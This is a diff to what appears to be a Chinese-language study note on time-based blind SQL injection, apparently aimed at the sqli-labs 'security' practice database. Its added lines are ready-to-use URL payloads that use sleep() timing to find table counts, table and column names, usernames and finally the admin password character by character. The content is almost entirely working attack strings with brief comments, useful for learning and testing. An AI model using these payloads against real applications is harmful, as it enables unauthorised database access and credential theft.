@@ -57,9 +57,35 @@
 ?id=1' and if(length(database())=8, sleep(5), 1) --+
 #结合 if() 和 length() 函数，判断数据库名长度是否为8
 
-?id=1' and if(ascii(substr(database(),1,1))=115, sleep(5), 1) --+
-#逐个猜解数据库名
+?id=1' and if(ascii(substr(database(),1,1))>100, sleep(5), 1) --+
+#逐个猜解数据库名 security
 
+?id=1' and if((select count(table_name) from information_schema.tables where table_schema='security')=4,sleep(5),1) --+
+#判断security数据库是否是4张表
+
+?id=1' and if(length((select table_name from information_schema.tables where table_schema='security' limit 0,1))=6,sleep(5),1) --+
+#分別判断数据表的长度（emails、referers‌、uagents‌、users‌）
+
+?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))>100,sleep(5),1) --+
+#逐个字符猜解，得到表名 
+
+?id=1' and if((select count(column_name) from information_schema.columns where table_name='users')=3,sleep(5),1) --+
+#猜解users表是否有3列
+
+?id=1' and if(length((select column_name from information_schema.columns where table_name='users' limit 0,1))=2,sleep(5),1) --+
+#猜解列的长度
+
+?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))>100,sleep(5),1) --+
+#猜解列名，如id，username，password
+
+?id=1' and if(length((select username from users limit 0,1))=4,sleep(5),1) --+
+#猜解username第一个记录的长度
+
+?id=1' and if(ascii(substr((select username from users limit 0,1),1,1))>68,sleep(5),1) --+
+#逐个字符猜解username的值
+
+?id=1' and if(ascii(substr((select password from users where username='admin' limit 0,1),1,1))>50,sleep(5),1) --+
+#猜解密码
 
 
 ```
